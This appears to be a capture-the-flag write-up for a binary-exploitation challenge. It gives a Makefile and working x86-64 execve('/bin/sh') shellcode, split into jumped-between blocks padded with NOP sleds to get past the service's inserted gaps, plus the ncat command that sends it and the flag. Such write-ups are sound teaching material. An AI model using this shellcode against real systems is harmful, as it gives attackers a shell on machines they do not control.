---
date: '2025-12-10T14:53:06+05:30'
title: 'Shellcode'

challenge-categories:
- Binary Exploitation
- Shellcode
- Programming

---

Nopsleds FTW

<!--more-->


## Problem Statement

You'll have to make your own shellcode for this one!

`nc challenges2.perfectroot.wiki 8003`

## Solve

This challenge reads and executes shellcode, but places 0x20 byte gaps after every 0xA shellcode bytes.

To bypass this, place nopsleds after every 0xA bytes of legit shellcode, and `jmp` to the next block.

No pwntools, just `Make` and `GNU Binutils`

```make
.PHONY: all
all: sc.bin

.PHONY: clean
clean:
    rm sc.bin

.PHONY: disas
disas: sc.bin
    objdump -D -b binary -m i386:x86-64 sc.bin -M intel

.PHONY: debug
debug: sc.elf

.PHONY: split
split: sc.bin
    dd if=sc.bin of=part1.bin bs=1 skip=0 count=10
    dd if=sc.bin of=part2.bin bs=1 skip=32 count=10
    dd if=sc.bin of=part3.bin bs=1 skip=64 count=10
    dd if=sc.bin of=part4.bin bs=1 skip=96 count=10

.PHONY: solve
solve: part1.bin part2.bin part3.bin part4.bin
    (cat part1.bin part2.bin part3.bin part4.bin; cat)  |  ncat challenges2.perfectroot.wiki 8003

%.elf: %.o
    ld -o $@ $<

%.bin: %.elf
    objcopy -O binary -j .text $< $@

%.o: %.s
    as --64 -o $@ $<
```

shellcode.s
```asm
.intel_syntax noprefix
.global _start
.global part1
.global part2
.global part3
.global part4

_start:
part1:
    lea rdi, QWORD PTR [rip+binsh]
    jmp part2
    nop

pad1:
    nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop

part2:
    xor rsi, rsi
    xor rdx, rdx
    jmp part3
    nop
    nop

pad2:
    nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop

part3:
    mov ax, 59
    syscall
    nop nop nop nop

pad3:
    nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop

part4:
binsh:
    .string "/bin/sh"

pad4:
    nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop nop
```


## Flag

```
[+] r00t{1m_als0_pretty_new_t0_pwn_sh3ll_c0d3}
```

